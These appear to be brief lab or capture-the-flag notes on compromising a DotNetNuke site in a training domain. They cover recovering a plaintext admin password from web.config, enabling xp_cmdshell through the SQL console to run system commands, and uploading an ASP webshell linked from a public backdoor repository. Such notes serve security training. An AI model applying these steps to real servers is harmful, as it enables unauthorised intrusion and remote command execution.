![[Pasted image 20250307154434.png]]

#### Admin Login
`http://dnn.inlanefreight.local/Login?returnurl=%2fadmin`

#### Credentials
Credentials stored in `web.config`
```xml
<?xml version="1.0"?>
<SNIP>
  <username>Administrator</username>
  <password>
	<value>D0tn31Nuk3R0ck$$@123</value>
  </password>
  <system.web>
    <compilation debug="true" targetFramework="4.5.2"/>
    <httpRuntime targetFramework="4.5.2"/>
  </system.web>
```

#### RCE
`Settings` -> `SQL Console
```sql
EXEC sp_configure 'show advanced options', '1'
RECONFIGURE
EXEC sp_configure 'xp_cmdshell', '1' 
RECONFIGURE

xp_cmdshell whoami
```

 RCE via webshell
`Settings` -> `Security` -> `More` -> `More Security Settings` -> `Allowable File Extensions`

Upload [ASP webshell](https://raw.githubusercontent.com/backdoorhub/shell-backdoor-list/master/shell/asp/newaspcmd.asp) to `http://dnn.inlane.local/admin/file-management` and select `Get URL`

![[Pasted image 20250307162207.png]]

